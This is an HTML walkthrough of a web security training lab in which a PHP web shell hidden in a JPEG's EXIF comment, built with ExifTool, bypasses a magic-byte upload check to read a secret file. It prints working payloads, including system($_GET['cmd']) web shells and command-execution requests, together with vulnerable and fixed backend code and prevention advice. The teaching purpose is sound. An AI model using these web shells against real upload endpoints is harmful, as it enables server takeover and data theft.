@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lab 06: Remote Code Execution via Polyglot Web Shell Upload</title>
+  <style>
+  @import url("https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.9.0-alpha2/katex.min.css");
+
+  body {
+    font-family: Georgia, Cambria, serif;
+    font-size: 14px;
+    line-height: 1.7;
+    color: #373D49;
+    max-width: 800px;
+    margin: 0 auto;
+    padding: 2rem;
+  }
+  h1, h2, h3, h4, h5, h6 {
+    font-family: "Source Sans Pro", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-weight: 600;
+    margin-top: 1.5em;
+    margin-bottom: 0.5em;
+  }
+  h1 { font-size: 2em; }
+  h2 { font-size: 1.5em; }
+  h3 { font-size: 1.25em; }
+  a { color: #35D7BB; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  code {
+    font-family: "Ubuntu Mono", Monaco, monospace;
+    background: #F5F7FA;
+    padding: 0.2em 0.4em;
+    border-radius: 3px;
+  }
+  pre {
+    background: #F5F7FA;
+    padding: 1em;
+    border-radius: 3px;
+    overflow-x: auto;
+  }
+  .hljs {
+    display: block;
+    overflow-x: auto;
+    padding: 0;
+    color: #333;
+  }
+  pre code { background: none; padding: 0; }
+  blockquote {
+    border-left: 3px solid #A0AABF;
+    padding-left: 1em;
+    margin-left: 0;
+    font-style: italic;
+    color: #666;
+  }
+  table {
+    border-collapse: collapse;
+    width: 100%;
+  }
+  th, td {
+    border: 1px solid #E8E8E8;
+    padding: 0.5em;
+    text-align: left;
+  }
+  th {
+    background: #F5F7FA;
+    font-weight: 600;
+  }
+  #preview .table {
+    width: auto;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+  }
+  .katex-display {
+    overflow-x: auto;
+    overflow-y: hidden;
+  }
+</style>
+</head>
+<body id="preview">
+<h1 class="code-line has-line-data" data-line-start="0" data-line-end="1"><a id="File_Upload_Vulnerabilities_Lab_6_Remote_Code_Execution_via_Polyglot_Web_Shell_Upload_0"></a>File Upload Vulnerabilities - Lab #6: Remote Code Execution via Polyglot Web Shell Upload</h1>
+<p class="has-line-data" data-line-start="2" data-line-end="3"><strong>YouTube Tutorial:</strong> <a href="https://youtu.be/LeqiXw8Sc8c?si=lqBFOpGJTwn3aLLw">File Upload Vulnerabilities - Lab #6 Remote code execution via polyglot web shell upload</a></p>
+<hr>
+<h2 class="code-line has-line-data" data-line-start="6" data-line-end="7"><a id="1_What_is_a_Polyglot_Web_Shell_6"></a>1. What is a Polyglot Web Shell?</h2>
+<h3 class="code-line has-line-data" data-line-start="8" data-line-end="9"><a id="Core_Concept_8"></a>Core Concept</h3>
+<p class="has-line-data" data-line-start="10" data-line-end="11">This lab’s validation is a real step up from anything in the earlier labs. Uploading <code>shell.php</code> doesn’t just get rejected on filename or Content-Type grounds — the error message itself is different in character, hinting that the server is actually looking <em>inside</em> the file. It’s checking the file’s <strong>magic bytes</strong>: the first few bytes of a file, which for well-known formats are a fixed, predictable signature. A real JPEG always starts with the hex sequence <code>FF D8 FF</code>; a real PNG always starts with <code>89 50 4E 47</code>. A plain-text PHP file starts with <code>&lt;?php</code>, which obviously matches neither — so the server can tell, correctly, that this “image” isn’t one at all.</p>
+<p class="has-line-data" data-line-start="12" data-line-end="13">The catch: magic bytes only need to be <em>present at the start</em> of the file. Nothing says the rest of the file has to be nothing but pristine, unmodified image data. Image formats like JPEG have well-defined regions for metadata — EXIF fields like camera model, GPS coordinates, and a free-text “Comment” field, all embedded inside an otherwise completely valid image. If you take a real, genuine JPEG and stuff PHP code into its Comment field, the file <em>starts</em> with valid JPEG magic bytes (satisfying the check), and <em>is</em> a fully valid, openable JPEG image in every practical sense — but somewhere inside it, buried in metadata a strict validator doesn’t care about, sits your PHP payload as plain text. This dual-nature file is called a <strong>polyglot</strong>: simultaneously a real image and a script.</p>
+<pre><code class="has-line-data" data-line-start="15" data-line-end="44">┌─────────────────────────────┐        ┌─────────────────────────────┐
+│   PLAIN TEXT PHP FILE        │        │   POLYGLOT JPEG/PHP FILE     │
+├─────────────────────────────┤        ├─────────────────────────────┤
+│ File starts with:            │        │ File starts with real JPEG   │
+│ &lt;?php echo ...               │        │ magic bytes: FF D8 FF E0     │
+│                               │        │                               │
+│ Magic byte check FAILS       │        │ Magic byte check PASSES —    │
+│ immediately — not a real     │        │ this genuinely IS a valid,   │
+│ image at all                 │        │ openable JPEG image          │
+└─────────────────────────────┘        └───────────────┬─────────────┘
+                                                         │
+                                                         ▼
+                                        ┌─────────────────────────────┐
+                                        │ But buried inside the JPEG's │
+                                        │ EXIF &quot;Comment&quot; metadata      │
+                                        │ field: &lt;?php echo ...  ?&gt;    │
+                                        └───────────────┬─────────────┘
+                                                         │
+                                                         ▼
+                                        ┌─────────────────────────────┐
+                                        │ Save this dual-format file   │
+                                        │ with a .php extension —      │
+                                        │ upload accepted, and when    │
+                                        │ visited, the PHP interpreter │
+                                        │ finds and runs the embedded  │
+                                        │ code = Remote Code           │
+                                        │ Execution ✅                 │
+                                        └─────────────────────────────┘
+</code></pre>
+<p class="has-line-data" data-line-start="45" data-line-end="46">The oracle here is that “is this a valid image” and “does this file only contain image data and nothing else” are two very different questions — a magic-byte check answers the first, but a polyglot file is specifically engineered to make the answer to the first “yes” while quietly smuggling something else entirely into the parts of the file format that were never meant to be checked.</p>
+<hr>
+<h2 class="code-line has-line-data" data-line-start="49" data-line-end="50"><a id="2_Attack_Overview_Key_Concepts_49"></a>2. Attack Overview &amp; Key Concepts</h2>
+<h3 class="code-line has-line-data" data-line-start="51" data-line-end="52"><a id="Vulnerability_Explanation_51"></a>Vulnerability Explanation</h3>
+<p class="has-line-data" data-line-start="53" data-line-end="54">This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>.</p>
+<ul>
+<li class="has-line-data" data-line-start="55" data-line-end="56"><strong>Provided Credentials:</strong> <code>wiener:peter</code></li>
+<li class="has-line-data" data-line-start="56" data-line-end="57"><strong>What Changed From Earlier Labs:</strong> The rejection message and behavior are noticeably different from a simple filename or Content-Type check — this app is genuinely inspecting file content, specifically the magic bytes at the start of the file, to confirm it’s a real image.</li>
+<li class="has-line-data" data-line-start="57" data-line-end="58"><strong>The Bypass Tool:</strong> ExifTool — a widely-used, free command-line utility for reading and writing image metadata, which happens to be perfect for embedding a PHP payload into a genuine image’s metadata without corrupting the image itself.</li>
+<li class="has-line-data" data-line-start="58" data-line-end="60"><strong>End Goal:</strong> Get PHP code executing on the server, use it to read <code>/home/carlos/secret</code>, and submit the contents.</li>
+</ul>
+<h3 class="code-line has-line-data" data-line-start="60" data-line-end="61"><a id="Root_Cause_Impact_60"></a>Root Cause &amp; Impact</h3>
+<p class="has-line-data" data-line-start="62" data-line-end="63">The root cause is that this validation checks a necessary but not sufficient condition for safety. Confirming a file <em>starts with</em> a real image signature tells you it genuinely is a parseable image — but it says nothing about whether <em>additional</em>, non-image content has also been smuggled in elsewhere in the file, particularly inside metadata fields that image formats are specifically designed to allow arbitrary user-supplied text in. Combined with the same fundamental issue as every lab in this module — the file still gets stored with script-executable permissions in a directory the web server will run PHP from — a magic-byte check alone is nowhere near sufficient to prevent a malicious upload.</p>
+<hr>
+<h2 class="code-line has-line-data" data-line-start="66" data-line-end="67"><a id="3_Attack_Methods_Techniques_What_I_Tried_and_What_Actually_Worked_66"></a>3. Attack Methods &amp; Techniques (What I Tried, and What Actually Worked)</h2>
+<p class="has-line-data" data-line-start="68" data-line-end="69"><strong>First move — the usual plain PHP file.</strong> Uploading <code>shell.php</code> directly. Rejected, as expected by now — but the specific error wording is worth reading carefully, since it can hint at <em>what</em> is being checked rather than just <em>that</em> something is being checked.</p>
+<p class="has-line-data" data-line-start="70" data-line-end="71"><strong>Testing whether it’s really content-based, not just filename-based.</strong> Trying the trick that solved Lab #5 — renaming the plain PHP file to something like <code>shell.php.jpg</code>, or applying the null byte technique. Neither works here the same way, or if the upload is accepted, visiting the resulting file doesn’t execute as PHP — a strong signal this app’s check goes deeper than just the filename string this time, and is genuinely reading file bytes.</p>
+<p class="has-line-data" data-line-start="72" data-line-end="73"><strong>Confirming the magic-byte theory.</strong> Uploading a real, unmodified <code>.jpg</code> image (renamed to <code>.php</code>, just to see what happens) — if the server is only checking the extension, this should still be rejected as looking like a PHP file by name; if it’s checking actual content, a genuine JPEG’s real bytes might sail through even with a <code>.php</code> extension, which is a meaningful clue about exactly what layer of validation is in play.</p>
+<p class="has-line-data" data-line-start="74" data-line-end="75"><strong>Building the polyglot.</strong> Since a real image’s magic bytes need to survive intact, the shell itself has to be layered <em>into</em> a real image rather than built from scratch as plain text. ExifTool is the standard tool for this — it can write arbitrary text into an image’s metadata fields (like the Comment field) without disturbing the image’s actual pixel data or its header/magic bytes at all. Running:</p>
+<pre><code class="has-line-data" data-line-start="77" data-line-end="79">exiftool -Comment=&quot;&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;&quot; avatar.jpg -o polyglot.php
+</code></pre>
+<p class="has-line-data" data-line-start="80" data-line-end="81">This takes a real <code>avatar.jpg</code>, injects the PHP payload into its Comment metadata field, and outputs the result directly as <code>polyglot.php</code> — so the final file already has the extension needed for the server to treat it as PHP, while its actual byte content still opens as a legitimate JPEG.</p>
+<p class="has-line-data" data-line-start="82" data-line-end="83"><strong>Uploading and confirming.</strong> Uploading <code>polyglot.php</code> through the normal avatar form. This time it’s accepted — the magic bytes check out, since the underlying image data is completely genuine. Visiting the uploaded file’s URL directly returns the executed PHP output, sandwiched between the <code>START</code> and <code>END</code> markers deliberately included in the payload to make the leaked secret easy to spot amid whatever other raw image/metadata bytes also get echoed in the response.</p>
+<h3 class="code-line has-line-data" data-line-start="84" data-line-end="85"><a id="Server_Behavior_84"></a>Server Behavior</h3>
+<ul>
+<li class="has-line-data" data-line-start="86" data-line-end="87"><strong>Uploading <code>shell.php</code> (plain PHP, no image data at all):</strong> Rejected — the file’s magic bytes don’t match any recognized image format.</li>
+<li class="has-line-data" data-line-start="87" data-line-end="88"><strong>Uploading a real <code>.jpg</code> renamed to <code>.php</code> (no PHP payload, just a genuine image with a misleading extension):</strong> Accepted by the content check (it IS a real image), but harmless — there’s no PHP code inside it to execute.</li>
+<li class="has-line-data" data-line-start="88" data-line-end="89"><strong>Uploading <code>polyglot.php</code> (real JPEG magic bytes and structure, PHP payload embedded in the Comment metadata field, saved with a <code>.php</code> extension):</strong> Accepted — the magic byte check passes because the file genuinely starts with valid JPEG data, and the embedded PHP payload sits further into the file, in a region the validator never inspects.</li>
+<li class="has-line-data" data-line-start="89" data-line-end="91"><strong>Requesting the uploaded polyglot file’s URL directly:</strong> The PHP interpreter processes the entire file, finds and executes the <code>&lt;?php ... ?&gt;</code> block embedded in the metadata, and the response includes both the executed script’s output and whatever raw image/metadata bytes surround it.</li>
+</ul>
+<hr>
+<h2 class="code-line has-line-data" data-line-start="93" data-line-end="94"><a id="4_StepbyStep_Walkthrough_93"></a>4. Step-by-Step Walkthrough</h2>
+<h3 class="code-line has-line-data" data-line-start="95" data-line-end="96"><a id="Step_1_Confirm_ContentBased_Validation_Is_in_Play_95"></a>Step 1: Confirm Content-Based Validation Is in Play</h3>
+<ol>
+<li class="has-line-data" data-line-start="97" data-line-end="98">Log in with <code>wiener:peter</code> and go to <strong>“My account.”</strong></li>
+<li class="has-line-data" data-line-start="98" data-line-end="100">Attempt to upload a plain <code>shell.php</code> file containing:</li>
+</ol>
+<pre><code class="has-line-data language-php" data-line-start="101" data-line-end="103"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/home/carlos/secret&#x27;</span>); <span class="hljs-meta">?&gt;</span>
+</code></pre>
+<ol start="3">
+<li class="has-line-data" data-line-start="104" data-line-end="106"><strong>Observation:</strong> Rejected. Compare this rejection’s wording/behavior against earlier labs if possible — a content-based check often behaves differently from a simple extension or Content-Type check (for example, it may reject files that pass a Content-Type spoof, unlike Lab #2).</li>
+</ol>
+<h3 class="code-line has-line-data" data-line-start="106" data-line-end="107"><a id="Step_2_Install_ExifTool_106"></a>Step 2: Install ExifTool</h3>
+<ol>
+<li class="has-line-data" data-line-start="108" data-line-end="109">If not already installed, download and install ExifTool from its official site (<a href="http://exiftool.org">exiftool.org</a>), or via your package manager (e.g. <code>apt install libimage-exiftool-perl</code> on Debian/Ubuntu, <code>brew install exiftool</code> on macOS).</li>
+<li class="has-line-data" data-line-start="109" data-line-end="111">Confirm it’s working by running <code>exiftool -ver</code> in your terminal — it should print a version number.</li>
+</ol>
+<h3 class="code-line has-line-data" data-line-start="111" data-line-end="112"><a id="Step_3_Obtain_a_Genuine_Image_to_Use_as_the_Base_111"></a>Step 3: Obtain a Genuine Image to Use as the Base</h3>
+<ol>
+<li class="has-line-data" data-line-start="113" data-line-end="115">Use any real <code>.jpg</code> or <code>.png</code> image file you have available — it doesn’t need to be anything special, just a genuine, unmodified, valid image. Save it locally, e.g. as <code>avatar.jpg</code>.</li>
+</ol>
+<h3 class="code-line has-line-data" data-line-start="115" data-line-end="116"><a id="Step_4_Inject_the_PHP_Payload_into_the_Images_Metadata_115"></a>Step 4: Inject the PHP Payload into the Image’s Metadata</h3>
+<ol>
+<li class="has-line-data" data-line-start="117" data-line-end="118">Open a terminal in the same directory as your image file.</li>
+<li class="has-line-data" data-line-start="118" data-line-end="120">Run the following command:</li>
+</ol>
+<pre><code class="has-line-data language-bash" data-line-start="121" data-line-end="123">exiftool -Comment=<span class="hljs-string">&quot;&lt;?php echo &#x27;START &#x27; . file_get_contents(&#x27;/home/carlos/secret&#x27;) . &#x27; END&#x27;; ?&gt;&quot;</span> avatar.jpg -o polyglot.php
+</code></pre>
+<ol start="3">
+<li class="has-line-data" data-line-start="124" data-line-end="129">Breaking this down:
+<ul>
+<li class="has-line-data" data-line-start="125" data-line-end="126"><code>-Comment=&quot;...&quot;</code> writes the given text into the image’s EXIF Comment metadata field.</li>
+<li class="has-line-data" data-line-start="126" data-line-end="127">The PHP payload itself reads the target secret file and wraps its output between the literal strings <code>START </code> and <code> END</code>, making it trivially easy to locate the leaked secret inside a larger, messier HTTP response later.</li>
+<li class="has-line-data" data-line-start="127" data-line-end="128"><code>avatar.jpg</code> is the genuine input image.</li>
+<li class="has-line-data" data-line-start="128" data-line-end="129"><code>-o polyglot.php</code> tells ExifTool to write the result to a new file, directly using the <code>.php</code> extension you’ll need for the server to treat it as executable PHP.</li>
+</ul>
+</li>
+<li class="has-line-data" data-line-start="129" data-line-end="131"><strong>Result:</strong> A new file, <code>polyglot.php</code>, now exists — structurally a completely valid JPEG (magic bytes, image data, and all), but with your PHP payload embedded as plain text inside its Comment metadata field.</li>
+</ol>
+<h3 class="code-line has-line-data" data-line-start="131" data-line-end="132"><a id="Step_5_Upload_the_Polyglot_File_131"></a>Step 5: Upload the Polyglot File</h3>
+<ol>
+<li class="has-line-data" data-line-start="133" data-line-end="134">Back on the “My account” page, use the avatar upload field to select and upload <code>polyglot.php</code>.</li>
+<li class="has-line-data" data-line-start="134" data-line-end="136"><strong>Result:</strong> The upload succeeds — the file’s magic bytes genuinely match a real JPEG, satisfying the content-based validation check.</li>
+</ol>
+<h3 class="code-line has-line-data" data-line-start="136" data-line-end="137"><a id="Step_6_Find_the_Uploaded_Files_URL_136"></a>Step 6: Find the Uploaded File’s URL</h3>
+<ol>
+<li class="has-line-data" data-line-start="138" data-line-end="139">Check Burp’s <strong>Proxy → HTTP history</strong>, or reload the account page and inspect the (likely broken-looking, since it’s not a “normal” JPEG anymore once PHP has run on it) avatar image’s URL.</li>
+<li class="has-line-data" data-line-start="139" data-line-end="141">This will typically look like:</li>
+</ol>
+<pre><code class="has-line-data" data-line-start="142" data-line-end="144">https://[LAB-ID].web-security-academy.net/files/avatars/polyglot.php
+</code></pre>
+<h3 class="code-line has-line-data" data-line-start="145" data-line-end="146"><a id="Step_7_Trigger_Execution_and_Extract_the_Secret_145"></a>Step 7: Trigger Execution and Extract the Secret</h3>
+<ol>
+<li class="has-line-data" data-line-start="147" data-line-end="148">Visit this URL directly in your browser, or send a <code>GET</code> request to it via Burp Repeater.</li>
+<li class="has-line-data" data-line-start="148" data-line-end="150"><strong>Result:</strong> The response contains a mix of raw image/metadata bytes and the executed PHP output. Look for the literal text <code>START </code> and <code> END</code> in the response body — the content between them is the actual contents of <code>/home/carlos/secret</code>.</li>
+</ol>
+<h3 class="code-line has-line-data" data-line-start="150" data-line-end="151"><a id="Step_8_Submit_the_Solution_150"></a>Step 8: Submit the Solution</h3>
+<ol>
+<li class="has-line-data" data-line-start="152" data-line-end="153">Copy the secret string found between the <code>START</code> and <code>END</code> markers.</li>
+<li class="has-line-data" data-line-start="153" data-line-end="154">Click the lab banner’s <strong>“Submit solution”</strong> button, paste the secret, and submit.</li>
+<li class="has-line-data" data-line-start="154" data-line-end="156">The lab banner updates to <strong>“Congratulations, you solved the lab!”</strong>.</li>
+</ol>
+<hr>
+<h2 class="code-line has-line-data" data-line-start="158" data-line-end="159"><a id="5_Different_Ways_to_Exploit_This_Alternative_Methods_Payloads_158"></a>5. Different Ways to Exploit This (Alternative Methods &amp; Payloads)</h2>
+<p class="has-line-data" data-line-start="160" data-line-end="161"><strong>Embedding the payload in different EXIF fields, in case the Comment field specifically gets stripped or sanitized:</strong></p>
+<pre><code class="has-line-data language-bash" data-line-start="163" data-line-end="166">exiftool <span class="hljs-string">&quot;-Artist=&lt;?php echo file_get_contents(&#x27;/home/carlos/secret&#x27;); ?&gt;&quot;</span> avatar.jpg -o polyglot.php
+exiftool <span class="hljs-string">&quot;-ImageDescription=&lt;?php system(<span class="hljs-variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span> avatar.jpg -o polyglot.php
+</code></pre>
+<p class="has-line-data" data-line-start="167" data-line-end="168">Different metadata fields (Artist, ImageDescription, Copyright, etc.) can serve the exact same purpose — worth having a couple of alternates ready in case a particular field is specially handled or scrubbed by image-processing libraries on the server side.</p>
+<p class="has-line-data" data-line-start="169" data-line-end="170"><strong>Manually constructing a polyglot without ExifTool, for environments where installing it isn’t an option:</strong></p>
+<p class="has-line-data" data-line-start="171" data-line-end="172">Some image formats’ comment sections can be edited directly with a hex editor or even a plain text editor if you know the format’s structure precisely — for JPEG specifically, appending PHP code after the End-Of-Image (<code>FF D9</code>) marker, or into a COM segment, can also work in many configurations, since some PHP-handling web servers will still parse and execute PHP tags found anywhere in a file, not just at the very beginning.</p>
+<p class="has-line-data" data-line-start="173" data-line-end="174"><strong>Using a general-purpose command shell instead of the single-file-read payload</strong>, exactly as in earlier labs:</p>
+<pre><code class="has-line-data language-bash" data-line-start="176" data-line-end="178">exiftool -Comment=<span class="hljs-string">&quot;&lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span> avatar.jpg -o polyglot.php
+</code></pre>
+<p class="has-line-data" data-line-start="179" data-line-end="180">Then interact via:</p>
+<pre><code class="has-line-data" data-line-start="182" data-line-end="185">GET /files/avatars/polyglot.php?cmd=id
+GET /files/avatars/polyglot.php?cmd=cat+/home/carlos/secret
+</code></pre>
+<p class="has-line-data" data-line-start="186" data-line-end="187">Useful when more than a single file read is needed during a real assessment.</p>
+<p class="has-line-data" data-line-start="188" data-line-end="189"><strong>Checking image thumbnails/EXIF data with a simple viewer first, to confirm your polyglot didn’t corrupt the image</strong>, using ExifTool’s own read mode:</p>
+<pre><code class="has-line-data language-bash" data-line-start="191" data-line-end="193">exiftool polyglot.php
+</code></pre>
+<p class="has-line-data" data-line-start="194" data-line-end="195">Running ExifTool against your own crafted file (without the <code>-Comment=</code> write flag) lets you review all embedded metadata fields, confirming your payload landed exactly where intended and that the file’s core image structure remains intact — useful as a sanity check before uploading.</p>
+<p class="has-line-data" data-line-start="196" data-line-end="197"><strong>Using an online or GUI-based EXIF editor as an alternative to the command line</strong>, for anyone less comfortable with terminal tools — numerous free EXIF editing tools and browser extensions provide the same Comment/metadata-editing capability as ExifTool, though the command-line approach is generally faster and more scriptable for repeated testing.</p>
+<hr>
+<h2 class="code-line has-line-data" data-line-start="200" data-line-end="201"><a id="6_If_This_Existed_in_the_Real_World_200"></a>6. If This Existed in the Real World</h2>
+<p class="has-line-data" data-line-start="202" data-line-end="203">Polyglot files exploiting the gap between “passes magic-byte/format validation” and “contains nothing else” are a well-documented, actively-used real-world technique:</p>
+<ul>
+<li class="has-line-data" data-line-start="204" data-line-end="205"><strong>Real-world WAF and antivirus evasion:</strong> Malware authors have long used polyglot files — combining valid PDF, JPEG, or ZIP structures with embedded executable payloads — specifically to evade security scanners that only check a file’s leading signature or perform shallow format validation, rather than fully parsing every region of the file.</li>
+<li class="has-line-data" data-line-start="205" data-line-end="206"><strong>CVE-documented image-processing library vulnerabilities:</strong> Beyond just metadata injection, real vulnerabilities have been found in specific image libraries (ImageMagick’s infamous “ImageTragick” vulnerability being a well-known example) where specially crafted image files—valid by format, but containing malicious embedded instructions—achieved remote code execution during server-side image processing itself, a related but distinct real-world consequence of the same “images can contain more than pixels” principle.</li>
+<li class="has-line-data" data-line-start="206" data-line-end="208"><strong>EXIF-based cross-site scripting and log injection:</strong> Even without achieving full RCE, EXIF metadata fields have been used in real bug bounty reports to inject XSS payloads or log-injection strings into applications that display uploaded images’ metadata back to other users without proper sanitization — the same “metadata fields are attacker-controlled free text” insight this lab teaches, applied to a different vulnerability class entirely.</li>
+</ul>
+<hr>
+<h2 class="code-line has-line-data" data-line-start="210" data-line-end="211"><a id="7_ProTips_Common_Pitfalls_210"></a>7. Pro-Tips &amp; Common Pitfalls</h2>
+<ul>
+<li class="has-line-data" data-line-start="212" data-line-end="213"><strong>Always use a genuinely valid base image, not a fake or corrupted one.</strong> The entire technique depends on the file’s magic bytes and overall structure being real and intact — starting from an already-broken or non-standard image file risks the magic-byte check failing regardless of your payload injection.</li>
+<li class="has-line-data" data-line-start="213" data-line-end="214"><strong>Wrap your leaked data in clear markers (<code>START</code>/<code>END</code> or similar).</strong> The HTTP response for a polyglot file will contain a mix of raw binary/metadata bytes alongside your script’s actual output — without clear delimiters, finding your target data inside that noise is far more tedious than it needs to be.</li>
+<li class="has-line-data" data-line-start="214" data-line-end="215"><strong>Verify your polyglot with ExifTool’s read mode before uploading</strong>, to catch mistakes early rather than debugging a failed upload blind.</li>
+<li class="has-line-data" data-line-start="215" data-line-end="216"><strong>Different image formats have different metadata capabilities</strong> — JPEG’s EXIF Comment field is a common, reliable choice, but PNG has its own metadata chunk system (tEXt, zTXt chunks) that ExifTool can also write to, worth knowing if a target specifically expects PNG uploads rather than JPEG.</li>
+<li class="has-line-data" data-line-start="216" data-line-end="218"><strong>The vulnerable backend pattern:</strong></li>
+</ul>
+<pre><code class="has-line-data language-php" data-line-start="219" data-line-end="235"><span class="hljs-comment">// ❌ VULNERABLE — only checks that the file&#x27;s leading bytes match a</span>
+<span class="hljs-comment">// known image signature, without verifying the file contains nothing else</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidImage</span>(<span class="hljs-params"><span class="hljs-variable">$filePath</span></span>) </span>{
+    <span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filePath</span>, <span class="hljs-string">&#x27;rb&#x27;</span>);
+    <span class="hljs-variable">$bytes</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$handle</span>, 4);
+    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$handle</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$bytes</span>) === <span class="hljs-string">&#x27;ffd8ffe0&#x27;</span>; <span class="hljs-comment">// JPEG magic bytes only</span>
+}
+<span class="hljs-comment">// A polyglot file passes this check trivially, since its magic bytes are genuine</span>
+
+<span class="hljs-comment">// ✅ SAFE — fully re-encode/re-process the image server-side (stripping all</span>
+<span class="hljs-comment">// metadata) using a trusted image library, rather than just checking magic bytes</span>
+<span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$uploadedFilePath</span>);
+<span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$safeOutputPath</span>); <span class="hljs-comment">// produces a clean image with NO original metadata</span>
+<span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="236" data-line-end="241"><strong>Prevention summary:</strong>
+<ul>
+<li class="has-line-data" data-line-start="237" data-line-end="238">Never rely on magic-byte checks alone — they only confirm a file <em>starts</em> like a real image, not that it contains <em>nothing but</em> image data.</li>
+<li class="has-line-data" data-line-start="238" data-line-end="239">Fully re-encode uploaded images server-side using a trusted image-processing library (which strips all metadata and regenerates clean pixel data in the process) rather than simply validating and passing through the original uploaded bytes.</li>
+<li class="has-line-data" data-line-start="239" data-line-end="240">Store re-processed images in a directory with script execution disabled, as defense-in-depth even if a polyglot somehow survives re-encoding.</li>
+<li class="has-line-data" data-line-start="240" data-line-end="241">Treat EXIF and other metadata fields as untrusted, attacker-controlled input anywhere they’re read, displayed, or processed by the application — not just in the context of file upload validation.</li>
+</ul>
+</li>
+</ul>
+
+</body>
+</html>
